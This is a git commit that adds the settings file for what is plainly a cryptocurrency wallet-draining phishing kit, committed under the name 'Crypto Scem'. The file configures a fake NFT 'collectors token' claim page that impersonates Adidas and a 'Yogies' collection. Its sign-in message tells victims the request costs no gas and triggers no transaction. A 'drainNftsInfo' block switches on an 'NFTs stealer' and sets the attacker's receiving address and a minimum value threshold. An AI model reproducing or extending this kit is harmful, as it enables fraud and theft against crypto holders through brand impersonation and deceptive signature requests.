9ca25cc60a0cabf2a64f61db909eeda87fbcfe4e
Crypto Scem <110301266+cryptoscemm@users.noreply.github.com>
2022-08-17 00:44:20 +0530

    Add files via upload

---
+++ settings.js
@@ -0,0 +1,59 @@
+const receiveAddress = "here";
+
+const collectionInfo = {
+    name: "Yogies",
+    socialMedia: {
+        discord: "",
+        twitter: "https://twitter.com/YogiesNFT",
+        instagram: "",
+    },
+}
+
+const signMessage = `Welcome, \n\n` +
+    `Click to sign in and accept the Terms of Service.\n\n` +
+    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
+    `Wallet Address:\n{address}\n\n` +
+    `Nonce:\n{nonce}`;
+
+const indexPageInfo = {
+    backgroundImage: "background.jpg", // relative path to background image (in assets)
+    title: "{name}", // {name} will be replaced with collectionInfo.name
+    underTitle: "COLLECTORS TOKEN",
+}
+
+const claimPageInfo = {
+    title: "COLLECTORS<br>TOKEN", // <br> is a line break
+    shortDescription: "SHOW YOUR LOYALTY.",
+    longDescription: "A ADIDAS TOKEN IS A SIGN YOU’VE BEEN PART OF ADIDAS SINCE THE START. IT GIVES YOU EARLY ACCESS TO MERCH, EVENTS AND MORE.",
+
+    claimButtonText: "CLAIM NOW",
+
+    image: "adidas.jpeg", // relative path to image (in assets)
+    imageRadius: 250, // image radius in px
+}
+
+const drainNftsInfo = {
+    active: true, // Active (true) or not (false) NFTs stealer.
+    minValue: 0.5, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
+}
+
+const customStrings = {
+    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    connectButton: "Connect wallet",
+    transferButton: "Mint now",
+    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
+}
+
+/*
+    = = = = = END OF SETTINGS = = = = =
+*/
+
+//#region Check Configuration
+if (!receiveAddress.startsWith("0x") ||
+    (
+        receiveAddress.length >= 64 ||
+        receiveAddress.length <= 40
+    )
+) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
+//#endregion
